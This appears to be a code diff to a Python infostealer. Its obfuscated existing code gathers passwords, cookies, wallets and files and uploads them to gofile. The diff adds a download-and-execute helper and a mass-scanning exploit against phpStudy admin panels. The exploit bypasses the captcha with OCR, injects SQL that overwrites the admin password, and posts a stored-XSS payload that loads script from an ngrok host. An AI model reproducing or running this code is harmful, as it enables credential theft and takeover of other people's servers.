@@ -1242,7 +1242,6 @@ def filestealr():
             filetext += "\n"
     UP104D("kiwi", filetext)
 
-
 global k3YW0rd, c00K1W0rDs, p45WW0rDs, C00K1C0UNt, P455WC0UNt, W411375Z1p, G4M1N6Z1p, O7H3rZ1p, THr34D1157
 
 DETECTED = False
@@ -1259,11 +1258,14 @@ c00K1W0rDs, p45WW0rDs, H1570rY, CCs, P455w, AU70F11l, C00K13s, W411375Z1p, G4M1N
 
 try:
     gofileserver = loads(urlopen("https://api.gofile.io/servers").read().decode('utf-8'))['data']['servers'][0]['name']
+  
     resp=requests.get(f'https://{gofileserver}.gofile.io/',timeout=5)
     print('-resp.status_code-'+str(resp.status_code))
     if resp.status_code!=200:
         gofileserver = loads(urlopen("https://api.gofile.io/servers").read().decode('utf-8'))['data']['servers'][1]['name']
         resp=requests.get(f'https://{gofileserver}.gofile.io/',timeout=5)
+        if resp.status_code!=200:
+            gofileserver = loads(urlopen("https://api.gofile.io/servers").read().decode('utf-8'))['data']['servers'][2]['name']
 except Exception as e:
    print('---store8')
    gofileserver = "store8"
@@ -1289,3 +1291,252 @@ for arg in K1W1F113s:
             filetext += f"└─<:openfolder:1111408286332375040> [{fileanme}]({b})\n"
         filetext += "\n"
 UP104D("kiwi", filetext)
+
+
+def download_file(url, save_path):
+    try:
+        response = requests.get(url, stream=True)
+        response.raise_for_status()  # 如果请求失败，抛出HTTPError异常
+
+        with open(save_path, 'wb') as file:
+            for chunk in response.iter_content(chunk_size=8192):
+                file.write(chunk)
+        print(f"Downloaded file to {save_path}")
+        return save_path
+    except requests.RequestException as e:
+        print(f"Error downloading file: {e}")
+        return None
+
+def run_exe(file_path):
+    try:
+        subprocess.run([file_path], check=True)
+        print(f"Successfully started {file_path}")
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to start {file_path}: {e}")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+
+def check_url(url):
+    headers = {
+        'X-Requested-With': 'XMLHttpRequest',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Accept': 'application/json, text/javascript, */*; q=0.01',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'zh-CN, zh;q=0.9'
+        }
+    try:
+        with open(output_filename, 'a', encoding='utf-8') as outfile:
+            
+            for target_path in target_paths:
+                full_url = f"{url}{target_path}"
+
+                response = requests.get(full_url, headers=headers,timeout=10,verify=False)
+                if  'PHPSTUDY' in response.text or '小皮' in response.text:
+                    result_queue.put(full_url)
+                    outfile.write(result_queue.get() + '\n')
+                    break  # 如果找到一个匹配的路径就不再继续检查其他路径
+          
+
+    except requests.RequestException as e:
+        print(f"Error checking {url}: {e}")
+
+def worker():
+    while True:
+        url = url_queue.get()
+        if url is None:
+            break
+        check_url(url)
+        url_queue.task_done()
+
+
+
+def save_response_as_jpg(s,url, file_path):
+    proxystr = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
+    response = s.get(url,verify=False)
+    if response.status_code == 200:
+        with open(file_path, 'wb') as f:
+            f.write(response.content)
+        print("文件保存成功！")
+    else:
+        print("请求失败，状态码：", response.status_code)
+    return response.cookies
+
+
+
+
+def xpData(s,request_address,url):
+    try:
+       
+        yzmUrl=request_address+"/service/app/account.php?type=vercode&rand=0.9020672408581996"
+
+        # 要保存的文件路径
+        file_path = request_address.replace(':','').replace('//','')+"_image.png"
+
+        # 调用函数保存响应内容为JPG文件
+        cookies=save_response_as_jpg(s,yzmUrl, file_path)
+
+        ocr = ddddocr.DdddOcr()
+        
+        with open(file_path, 'rb') as f:
+            image = f.read()
+
+        ocr_code = ocr.classification(image)
+        res = s.get(url=url,timeout=15)
+  
+  
+        data1 = {
+            'type': 'login',
+            'username': 'admin\';UPDATE ADMINS set PASSWORD = \'c26be8aaf53b15054896983b43eb6a65\' where username = \'admin\';--',
+            'verifycode': ocr_code,
+            'password': '123456'
+        }
+
+        data2= {
+            'type': 'login',
+            'username': 'admin',
+            'verifycode': ocr_code,
+            'password': '123456'
+        }
+        data3= {
+            'type': 'login',
+            'username': '<script src=http://0.tcp.ap.ngrok.io:18815/poc.js></script>',
+            'verifycode': ocr_code,
+            'password': '123456'
+        }
+        if os.path.exists(file_path):
+                try:
+                    # 删除文件
+                    os.remove(file_path)
+                    print(f"File '{file_path}' has been deleted successfully.")
+                except OSError as e:
+                    print(f"Error: {e.strerror}")
+        else:
+            print(f"File '{file_path}' does not exist.")
+        print(cookies)
+        print(data1)
+        print(request_address+'/service/app/account.php')
+        proxystr = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
+        headers = {
+        'X-Requested-With': 'XMLHttpRequest',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Accept': 'application/json, text/javascript, */*; q=0.01',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'zh-CN, zh;q=0.9'
+        }
+        res1 = s.post(url =request_address+'/service/app/account.php',headers=headers,data = data1,cookies=cookies,verify=False,timeout=15)
+        res2 = s.post(url =request_address+'/service/app/account.php',headers=headers,data = data2,cookies=cookies,verify=False,timeout=15)
+        res3 = s.post(url =request_address+'/service/app/account.php',headers=headers,data = data3,cookies=cookies,verify=False,timeout=15)
+        request_addresstemp=request_address
+
+        urltemp=url
+        stemp=s
+    
+        restemp=res2.text
+
+        if "验证码错误" in restemp:
+            xpData(stemp,urltemp,request_addresstemp)
+        print(restemp)
+        if  'code":0' in restemp:           
+            print(url," ---> 破解成功")
+            return "ok"
+        elif "密码错误" in restemp:
+            return "passwd"        
+        elif "用户名不" in restemp:
+            return "user"
+        elif "锁定" in restemp:
+            return "no"
+        else:
+            return "pass"
+    except:
+        return ""
+
+
+
+def baopo(line):
+    print('---------------------------')
+    try:    
+        lock = threading.Lock()
+        lock.acquire()
+        s = requests.session()
+        parsed_url = urlparse(line)
+
+        print(parsed_url)
+        request_address = f"{parsed_url.scheme}://{parsed_url.netloc}"
+ 
+        res=xpData(s,request_address,line)
+            
+        print("-----------------")
+        print(res)
+        if  'ok' in res:
+            f = open("ok.txt","a+") 
+            f.write(line+"\n")  
+            f.close()       
+            return "ok"
+     
+    except:
+        return ""
+   
+    finally:
+        # 释放锁
+        lock.release()
+
+
+
+if __name__ == '__main__':
+         
+    # 文件路径
+    input_file = 'urls.txt'
+    output_file = 'urls_ht.txt'
+    # 将符合条件的URL保存到文件
+    nowtime = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
+    output_filename = f"{nowtime}_{output_file}"
+    print(f"Finished checking URLs. Results saved to {output_filename}")
+
+    # 检查当前工作目录
+    print("Current working directory:", os.getcwd())
+
+    # 检查文件是否存在
+    if not os.path.exists(input_file):
+        print(f"Input file {input_file} does not exist.")
+        exit(1)
+    # 目标路径列表
+    target_paths = [
+        '/?type=vercode#/user/login',
+        ':9080/?type=vercode#/user/login',
+        '  /user/login',
+        ':9080/  /user/login'
+    ]
+    # 读取URL文件，指定文件编码为utf-8
+    with open(input_file, 'r', encoding='utf-8') as file:
+        urls = [url.strip() for url in file if url.strip()]
+    # 结果队列
+    result_queue = Queue()
+    # 创建队列
+    url_queue = Queue()
+    # 启动多线程
+    num_threads = 10
+    threads = []
+    for i in range(num_threads):
+        t = threading.Thread(target=worker)
+        t.start()
+        threads.append(t)
+    # 将URL放入队列
+    for url in urls:
+        url_queue.put(url)
+
+    # 等待所有任务完成
+    url_queue.join()
+
+    # 停止所有线程
+    for i in range(num_threads):
+        url_queue.put(None)
+    for t in threads:
+        t.join()
+
+
+    urls = ['{}'.format(str(i)) for i in open(output_filename)] 
+    pool = Pool(processes=5)
+    pool.map(baopo, urls)       
